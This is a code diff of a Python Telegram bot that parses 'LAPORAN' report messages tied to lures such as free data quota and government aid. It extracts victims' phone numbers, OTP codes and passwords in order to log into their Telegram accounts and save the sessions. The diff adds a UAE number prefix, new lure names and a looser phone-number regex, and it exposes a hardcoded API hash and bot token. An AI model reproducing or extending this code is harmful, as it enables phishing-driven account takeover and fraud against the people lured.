@@ -10,12 +10,12 @@ api_id = 23520639
 api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'
 bot_token = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
 
-SESSIONS_FOLDER = "a4_sessions"
+SESSIONS_FOLDER = "a11_sessions"
 sessions_folder = "sessions"  # Folder tujuan untuk menyimpan session yang berhasil login
 pending_login = {}  # {phone: (TelegramClient, password)}
 
 # === Whitelist Kode Negara ===
-ALLOWED_PREFIXES = ["+62", "+60"]
+ALLOWED_PREFIXES = ["+62", "+60", "+971"]
 
 # === Fungsi Validasi Nomor Telepon ===
 def is_valid_phone_number(phone):
@@ -52,9 +52,10 @@ async def handler(event):
         '❮ LAPORAN AHMAD SANJAYA ❯',
         '❮ LAPORAN My Kasih ❯',
         '❮ LAPORAN GRATIS KUOTA ❯',
-        '❮ LAPORAN TATTO KRIBO  ❯'
+        '❮ LAPORAN Uang Kuno ❯',
+        '❮ LAPORAN BANTUAN MADANI ❯'
     ]):
-        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', msg)
+        phone_match = re.search(r'(?:PHONE\s+NUMBER|NUMBER)\s*:\s*(\+\d+)', msg)
         otp_match = re.search(r'OTP\s*:\s*(\d{5,6})', msg)
         password_match = re.search(r'PASSWORD\s*:\s*(\S+)', msg)
 
